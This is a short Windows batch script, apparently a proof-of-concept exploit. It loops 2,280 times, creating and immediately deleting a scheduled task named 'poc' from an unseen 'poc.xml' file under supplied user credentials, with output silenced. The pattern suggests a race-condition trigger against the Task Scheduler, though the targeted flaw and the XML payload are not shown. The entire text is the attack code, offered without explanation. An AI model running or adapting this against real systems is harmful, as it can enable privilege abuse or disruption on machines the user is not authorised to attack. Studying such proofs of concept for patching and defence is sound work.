@echo off
for /l %%i in (1,1, 2280) do ( 
    schtasks /create /tn poc /xml poc.xml /ru <user> /rp <password> >nul 2>&1 & schtasks /delete /tn poc /f >nul 2>&1
)
echo OK